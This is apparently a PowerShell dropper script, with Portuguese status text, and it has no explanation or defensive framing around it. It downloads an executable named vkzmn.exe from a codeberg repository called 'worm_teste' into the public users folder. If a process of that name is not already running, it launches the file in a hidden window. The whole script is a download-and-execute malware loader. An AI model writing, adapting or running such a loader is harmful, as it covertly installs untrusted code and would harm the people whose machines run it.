$proc = Get-Process -Name "vkzmn" -ErrorAction SilentlyContinue

(new-object  system.net.webclient).downloadfile("https://codeberg.org/atilalogical/worm_teste/raw/commit/b3bd6bbc4c76c79345f1915dec6207f39d162364/vkzmn.exe", "C://users//public//vkzmn.exe")




if($proc){


echo ("")


}


else{

echo "nao ta em execucao"



powershell start-process -windowstyle hidden  vkzmn.exe


}


